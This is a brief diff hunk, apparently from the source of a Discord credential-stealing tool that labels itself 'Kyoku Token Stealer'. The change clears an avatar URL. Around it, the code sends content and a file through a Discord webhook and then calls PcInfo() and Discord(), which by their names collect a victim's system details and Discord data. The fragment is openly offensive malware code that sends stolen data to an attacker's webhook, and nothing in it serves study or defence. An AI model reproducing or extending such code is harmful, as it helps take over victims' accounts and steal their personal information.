@@ -64,7 +64,7 @@ def main(webhook: str):
         elif __PINGTYPE__ == "here":
             content += "@here"
 
-    webhook.send(content=content, file=_file, avatar_url="https://cdn.discordapp.com/attachments/1083105927906988063/1087777569815928872/Baslksz-1.png", username="Kyoku Token Stealer")
+    webhook.send(content=content, file=_file, avatar_url="", username="Kyoku Token Stealer")
     PcInfo()
     Discord()
 
